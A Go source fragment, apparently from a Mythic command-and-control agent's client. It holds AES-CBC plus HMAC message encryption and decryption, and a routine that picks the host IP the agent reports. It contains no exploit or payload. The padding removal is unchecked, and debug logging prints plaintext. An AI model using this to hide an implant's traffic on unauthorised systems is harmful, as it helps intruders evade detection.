func (client *Client) aesEncrypt(plaintext []byte) ([]byte, error) {
	// Mythic AES256 Encryption Details
	// Padding: PKCS7, block size of 16
	// Mode: CBC
	// IV is 16 random bytes
	// Final message: IV + Ciphertext + HMAC
	// where HMAC is SHA256 with the same AES key over (IV + Ciphertext)

	cli.Message(cli.DEBUG, "Entering into clients.mythic.aesEncrypt()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Plaintext:\r\n%s", plaintext))

	// Pad plaintext
	padding := aes.BlockSize - len(plaintext)%aes.BlockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	plaintext = append(plaintext, padtext...)

	if len(plaintext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("plaintext size: %d is not a multiple of the block size: %d", len(plaintext), aes.BlockSize)
	}

	block, err := aes.NewCipher(client.secret)
	if err != nil {
		return nil, err
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	// AES CBC Encrypt
	cbc := cipher.NewCBCEncrypter(block, iv)
	cbc.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)

	// HMAC
	hash := hmac.New(sha256.New, client.secret)
	_, err = hash.Write(ciphertext)
	if err != nil {
		return nil, fmt.Errorf("there was an error in the aesEncrypt function writing the HMAC:\r\n%s", err)
	}

	// IV + Ciphertext + HMAC
	return append(ciphertext, hash.Sum(nil)...), nil
}

// aesDecrypt reads in ciphertext data as a byte slice, decrypts it with the client's secret key, and returns the plaintext
func (client *Client) aesDecrypt(ciphertext []byte) ([]byte, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.aesDecrypt()...")
	var block cipher.Block
	var err error

	if block, err = aes.NewCipher(client.secret); err != nil {
		return nil, err
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext was not greater than the AES block size")
	}

	// IV + Ciphertext + HMAC
	iv := ciphertext[:aes.BlockSize]
	hash := ciphertext[len(ciphertext)-32:]
	ciphertext = ciphertext[aes.BlockSize : len(ciphertext)-32]

	// Verify encrypted data is a multiple of the block size
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext was not a multiple of the AES block size")
	}

	// Verify the HMAC hash
	h := hmac.New(sha256.New, client.secret)
	_, err = h.Write(append(iv, ciphertext...))
	if err != nil {
		return nil, fmt.Errorf("there was an error in the aesDecrypt function writing the HMAC:\r\n%s", err)
	}
	if !hmac.Equal(h.Sum(nil), hash) {
		return nil, fmt.Errorf("there was an error validating the AES HMAC hash, expected: %x but got: %x", h.Sum(nil), hash)
	}

	// AES CBC Decrypt
	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(ciphertext, ciphertext)

	// Remove padding
	ciphertext = ciphertext[:(len(ciphertext) - int(ciphertext[len(ciphertext)-1]))]

	return ciphertext, nil
}

// selectIP attempts to identify the single IP address to associate with the agent from all interfaces on the host
// The goal is to remove link-local and loopback addresses.
func selectIP(ips []string) string {
	for _, ip := range ips {
		if !strings.HasPrefix(ip, "127.") && !strings.HasPrefix(ip, "::1/128") && !strings.HasPrefix(ip, "fe80::") {
			return ip
		}
	}
	return ips[0]
}
